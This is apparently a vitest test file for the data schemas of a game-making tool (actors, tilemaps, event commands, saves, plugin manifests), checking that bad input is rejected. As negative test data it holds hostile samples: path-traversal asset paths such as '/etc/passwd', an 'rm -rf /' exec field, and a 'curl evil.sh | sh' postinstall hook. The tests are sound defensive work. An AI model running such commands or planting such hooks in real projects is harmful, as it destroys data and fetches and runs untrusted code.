import { describe, expect, it } from 'vitest'

import {
  ActorSchema,
  AssetPathSchema,
  ClassSchema,
  CollisionFlags,
  EnemySchema,
  EventCommandSchema,
  EventPageSchema,
  ItemSchema,
  PluginManifestSchema,
  ProjectSchema,
  SAVE_STATE_VERSION,
  SaveStateSchema,
  SkillSchema,
  TilemapSchema,
} from '../src'
import { emptyLayerData, growth, stats, validMap, validProject } from './fixtures'

const issuePaths = (result: {
  success: boolean
  error?: { issues: { path: PropertyKey[] }[] }
}): string[] => result.error?.issues.map((issue) => issue.path.join('.')) ?? []

describe('database schemas', () => {
  it('accepts a valid actor and applies defaults', () => {
    const actor = ActorSchema.parse({ id: 1, name: 'Hero', classId: 2 })
    expect(actor).toMatchObject({ initialLevel: 1, maxLevel: 99, nickname: '', description: '' })
  })

  it('rejects hallucinated fields on every record type', () => {
    const extra = { hallucinated: 'superpower' }
    expect(ActorSchema.safeParse({ id: 1, name: 'Hero', classId: 1, ...extra }).success).toBe(false)
    expect(
      ClassSchema.safeParse({ id: 1, name: 'W', baseStats: stats, growth, ...extra }).success,
    ).toBe(false)
    expect(
      ItemSchema.safeParse({ id: 1, name: 'Potion', kind: 'consumable', ...extra }).success,
    ).toBe(false)
    expect(SkillSchema.safeParse({ id: 1, name: 'Slash', target: 'enemy', ...extra }).success).toBe(
      false,
    )
    expect(EnemySchema.safeParse({ id: 1, name: 'Slime', stats, ...extra }).success).toBe(false)
  })

  it('rejects out-of-range and mistyped values', () => {
    expect(ActorSchema.safeParse({ id: 0, name: 'Hero', classId: 1 }).success).toBe(false)
    expect(ActorSchema.safeParse({ id: 1.5, name: 'Hero', classId: 1 }).success).toBe(false)
    expect(ActorSchema.safeParse({ id: 1, name: '   ', classId: 1 }).success).toBe(false)
    expect(ActorSchema.safeParse({ id: '1', name: 'Hero', classId: 1 }).success).toBe(false)
    expect(
      ActorSchema.safeParse({ id: 1, name: 'Hero', classId: 1, initialLevel: 100 }).success,
    ).toBe(false)
    expect(ItemSchema.safeParse({ id: 1, name: 'x', kind: 'artifact' }).success).toBe(false)
    expect(EnemySchema.safeParse({ id: 1, name: 'x', stats: { ...stats, maxHp: 0 } }).success).toBe(
      false,
    )
    expect(
      EnemySchema.safeParse({ id: 1, name: 'x', stats, drops: [{ itemId: 1, chance: 1.5 }] })
        .success,
    ).toBe(false)
  })

  it('validates effect payloads as a discriminated union', () => {
    expect(
      ItemSchema.safeParse({
        id: 1,
        name: 'x',
        kind: 'consumable',
        effects: [{ type: 'recoverHp', value: 5 }],
      }).success,
    ).toBe(true)
    expect(
      ItemSchema.safeParse({
        id: 1,
        name: 'x',
        kind: 'consumable',
        effects: [{ type: 'summonDragon', value: 5 }],
      }).success,
    ).toBe(false)
  })

  it('rejects asset paths that escape the project', () => {
    ;[
      '/etc/passwd',
      '../secrets.png',
      'img/../../x.png',
      'img\\x.png',
      'C:/x.png',
      'img//x.png',
      '',
    ].forEach((path) => {
      expect(AssetPathSchema.safeParse(path).success, path).toBe(false)
    })
    expect(AssetPathSchema.safeParse('img/characters/hero.png').success).toBe(true)
  })

  it('only allows strict JSON in plugin extensions', () => {
    const base = { id: 1, name: 'Hero', classId: 1 }
    expect(
      ActorSchema.safeParse({ ...base, extensions: { quest: { stage: 2, tags: ['a'] } } }).success,
    ).toBe(true)
    expect(ActorSchema.safeParse({ ...base, extensions: { fn: () => 1 } }).success).toBe(false)
    expect(ActorSchema.safeParse({ ...base, extensions: { when: new Date() } }).success).toBe(false)
  })
})

describe('TilemapSchema', () => {
  it('accepts a consistent map', () => {
    expect(TilemapSchema.safeParse(validMap()).success).toBe(true)
  })

  it('rejects layers or collision whose size disagrees with width x height', () => {
    const badLayer = TilemapSchema.safeParse(
      validMap({ layers: [{ name: 'Ground', visible: true, data: emptyLayerData(11) }] }),
    )
    expect(badLayer.success).toBe(false)
    expect(issuePaths(badLayer)).toContain('layers.0.data')

    const badCollision = TilemapSchema.safeParse(validMap({ collision: [0, 0] }))
    expect(badCollision.success).toBe(false)
    expect(issuePaths(badCollision)).toContain('collision')
  })

  it('rejects unsupported tile sizes, empty layer lists and oversized maps', () => {
    expect(TilemapSchema.safeParse(validMap({ tileSize: 20 })).success).toBe(false)
    expect(TilemapSchema.safeParse(validMap({ layers: [] })).success).toBe(false)
    expect(TilemapSchema.safeParse(validMap({ width: 100_000 })).success).toBe(false)
  })

  it('rejects collision flags outside the defined bit range', () => {
    const collision = Array.from({ length: 12 }, (_, index) => (index === 0 ? 32 : 0))
    expect(TilemapSchema.safeParse(validMap({ collision })).success).toBe(false)
    const combined = Array.from({ length: 12 }, (_, index) =>
      index === 0 ? CollisionFlags.BLOCK_UP | CollisionFlags.BLOCK_LEFT : 0,
    )
    expect(TilemapSchema.safeParse(validMap({ collision: combined })).success).toBe(true)
  })

  it('rejects negative or fractional tile ids', () => {
    const negative = validMap({
      layers: [{ name: 'Ground', visible: true, data: [...emptyLayerData(11), -1] }],
    })
    expect(TilemapSchema.safeParse(negative).success).toBe(false)
    const fractional = validMap({
      layers: [{ name: 'Ground', visible: true, data: [...emptyLayerData(11), 1.5] }],
    })
    expect(TilemapSchema.safeParse(fractional).success).toBe(false)
  })

  it('rejects events outside the map or sharing an id', () => {
    const event = (id: number, x: number, y: number) => ({ id, x, y, pages: [{}] })
    expect(TilemapSchema.safeParse(validMap({ events: [event(1, 3, 2)] })).success).toBe(true)
    expect(TilemapSchema.safeParse(validMap({ events: [event(1, 4, 0)] })).success).toBe(false)
    expect(
      TilemapSchema.safeParse(validMap({ events: [event(1, 0, 0), event(1, 1, 1)] })).success,
    ).toBe(false)
  })
})

describe('event schemas', () => {
  it('parses the semantic commands from the architecture document', () => {
    const parsed = EventCommandSchema.parse({
      command: 'ShowText',
      face: 'Actor1',
      text: 'Hello, world!',
    })
    expect(parsed).toEqual({ command: 'ShowText', face: 'Actor1', text: 'Hello, world!' })
  })

  it('accepts every command kind', () => {
    const commands = [
      { command: 'ShowText', text: 'Hi' },
      { command: 'TransferPlayer', mapId: 2, x: 1, y: 1, direction: 'up' },
      { command: 'SetSwitch', switchId: 1, value: true },
      { command: 'SetVariable', variableId: 1, value: 5 },
      { command: 'PlaySE', name: 'coin' },
      { command: 'PlayBGM', name: 'town' },
      { command: 'PlayBGS', name: 'rain' },
      { command: 'PlayME', name: 'fanfare' },
      { command: 'Wait', frames: 30 },
    ]
    commands.forEach((command) => {
      expect(EventCommandSchema.safeParse(command).success, command.command).toBe(true)
    })
  })

  it('applies audio defaults', () => {
    expect(EventCommandSchema.parse({ command: 'PlaySE', name: 'coin' })).toEqual({
      command: 'PlaySE',
      name: 'coin',
      volume: 90,
      pitch: 100,
    })
  })

  it('rejects unknown commands, missing fields and extra fields', () => {
    expect(EventCommandSchema.safeParse({ command: 'FormatDisk' }).success).toBe(false)
    expect(EventCommandSchema.safeParse({ command: 'ShowText' }).success).toBe(false)
    expect(
      EventCommandSchema.safeParse({ command: 'ShowText', text: 'x', exec: 'rm -rf /' }).success,
    ).toBe(false)
    expect(
      EventCommandSchema.safeParse({ command: 'PlaySE', name: 'x', volume: 101 }).success,
    ).toBe(false)
    expect(EventCommandSchema.safeParse({ command: 'Wait', frames: 0 }).success).toBe(false)
    expect(
      EventCommandSchema.safeParse({ command: 'SetSwitch', switchId: 1, value: 'yes' }).success,
    ).toBe(false)
  })

  it('validates nested commands inside branches', () => {
    const branch = {
      command: 'ConditionalBranch',
      condition: { type: 'switch', switchId: 1 },
      then: [{ command: 'ShowText', text: 'on' }],
      else: [
        {
          command: 'ConditionalBranch',
          condition: { type: 'variable', variableId: 1, comparator: '>=', value: 3 },
          then: [],
        },
      ],
    }
    expect(EventCommandSchema.safeParse(branch).success).toBe(true)
    const poisoned = { ...branch, then: [{ command: 'ShowText', text: 'on', evil: true }] }
    expect(EventCommandSchema.safeParse(poisoned).success).toBe(false)
  })

  it('defaults event pages to action-triggered, solid and empty', () => {
    expect(EventPageSchema.parse({})).toEqual({
      conditions: [],
      trigger: 'action',
      graphic: null,
      solid: true,
      commands: [],
    })
    expect(EventPageSchema.safeParse({ trigger: 'telepathy' }).success).toBe(false)
  })
})

describe('SaveStateSchema', () => {
  const save = {
    version: SAVE_STATE_VERSION,
    projectName: 'Test Quest',
    tick: 120,
    rngState: 12345,
    mapId: 1,
    player: { x: 1, y: 2, direction: 'down' },
    entities: [{ eventId: 1, x: 3, y: 1, direction: 'left' }],
    party: [{ actorId: 1, level: 3, experience: 40, hp: 90, mp: 10 }],
    switches: { '1': true, '12': false },
    variables: { '1': -5 },
    inventory: { '1': 3 },
    gold: 250,
  }

  it('accepts a complete save and survives a JSON round trip', () => {
    const parsed = SaveStateSchema.parse(save)
    expect(SaveStateSchema.parse(JSON.parse(JSON.stringify(parsed)))).toEqual(parsed)
  })

  it('rejects wrong versions, bad ids and fractional state', () => {
    expect(SaveStateSchema.safeParse({ ...save, version: 2 }).success).toBe(false)
    expect(SaveStateSchema.safeParse({ ...save, switches: { zero: true } }).success).toBe(false)
    expect(SaveStateSchema.safeParse({ ...save, switches: { '0': true } }).success).toBe(false)
    expect(SaveStateSchema.safeParse({ ...save, variables: { '1': 1.5 } }).success).toBe(false)
    expect(SaveStateSchema.safeParse({ ...save, gold: -1 }).success).toBe(false)
    expect(SaveStateSchema.safeParse({ ...save, inventory: { '1': 0 } }).success).toBe(false)
    expect(SaveStateSchema.safeParse({ ...save, rngState: 2 ** 32 }).success).toBe(false)
    expect(SaveStateSchema.safeParse({ ...save, cheats: true }).success).toBe(false)
  })
})

describe('ProjectSchema', () => {
  it('accepts a cross-referentially valid project', () => {
    expect(ProjectSchema.safeParse(validProject()).success).toBe(true)
  })

  it('rejects dangling references that an AI might hallucinate', () => {
    const project = validProject() as ReturnType<
      typeof structuredClone<{
        meta: object
        database: {
          actors: object[]
          classes: { learnings: object[] }[]
          enemies: { drops: object[] }[]
        }
        maps: object[]
      }>
    >
    const withActorClass = {
      ...project,
      database: { ...project.database, actors: [{ id: 1, name: 'Hero', classId: 99 }] },
    }
    expect(ProjectSchema.safeParse(withActorClass).success).toBe(false)

    const withStartMap = { ...project, meta: { ...project.meta, startMapId: 7 } }
    expect(ProjectSchema.safeParse(withStartMap).success).toBe(false)

    const withStartOutside = { ...project, meta: { ...project.meta, startX: 50 } }
    expect(ProjectSchema.safeParse(withStartOutside).success).toBe(false)

    const withDrop = {
      ...project,
      database: {
        ...project.database,
        enemies: [{ ...project.database.enemies[0], drops: [{ itemId: 42, chance: 1 }] }],
      },
    }
    expect(ProjectSchema.safeParse(withDrop).success).toBe(false)
  })

  it('rejects duplicate ids within a table and across maps', () => {
    const project = validProject() as { database: { items: object[] }; maps: object[] }
    const item = project.database.items[0]
    const duplicateItems = { ...project, database: { ...project.database, items: [item, item] } }
    expect(ProjectSchema.safeParse(duplicateItems).success).toBe(false)
    const duplicateMaps = { ...project, maps: [project.maps[0], project.maps[0]] }
    expect(ProjectSchema.safeParse(duplicateMaps).success).toBe(false)
  })

  it('rejects the wrong format marker', () => {
    const project = validProject() as { meta: object }
    expect(
      ProjectSchema.safeParse({ ...project, meta: { ...project.meta, format: 'rpg-maker-mz' } })
        .success,
    ).toBe(false)
  })
})

describe('PluginManifestSchema', () => {
  const manifest = {
    id: 'acme.quest-log',
    name: 'Quest Log',
    version: '1.0.0',
    capabilities: ['events', 'store'],
    entries: { shared: 'shared.js', editor: 'editor.js', engine: 'engine.js' },
  }

  it('accepts a valid manifest', () => {
    expect(PluginManifestSchema.safeParse(manifest).success).toBe(true)
  })

  it('rejects unknown capabilities, bad ids and versions, and missing entries', () => {
    expect(PluginManifestSchema.safeParse({ ...manifest, capabilities: ['root'] }).success).toBe(
      false,
    )
    expect(PluginManifestSchema.safeParse({ ...manifest, id: 'Bad Id' }).success).toBe(false)
    expect(PluginManifestSchema.safeParse({ ...manifest, version: 'latest' }).success).toBe(false)
    expect(PluginManifestSchema.safeParse({ ...manifest, entries: {} }).success).toBe(false)
    expect(
      PluginManifestSchema.safeParse({ ...manifest, entries: { editor: '../editor.js' } }).success,
    ).toBe(false)
  })

  it('rejects duplicates and self-dependency', () => {
    expect(
      PluginManifestSchema.safeParse({ ...manifest, capabilities: ['events', 'events'] }).success,
    ).toBe(false)
    expect(
      PluginManifestSchema.safeParse({ ...manifest, dependencies: ['acme.quest-log'] }).success,
    ).toBe(false)
    expect(
      PluginManifestSchema.safeParse({ ...manifest, postinstall: 'curl evil.sh | sh' }).success,
    ).toBe(false)
  })
})
